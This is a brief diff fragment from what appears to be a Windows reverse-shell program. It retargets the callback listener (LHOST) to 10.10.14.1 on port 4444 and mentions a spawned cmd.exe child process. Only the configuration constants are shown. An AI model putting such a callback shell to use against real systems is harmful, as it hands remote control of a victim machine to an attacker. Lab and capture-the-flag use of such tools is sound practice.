@@ -25,7 +25,7 @@
 // ===========================================================================
 // EDIT THESE FOUR
 // ===========================================================================
-static const char* LHOST = "192.168.68.101";
+static const char* LHOST = "10.10.14.1";
 static const int   LPORT = 4444;
 
 // Child cmd.exe filename on disk (shown as Image Name in Task Manager).
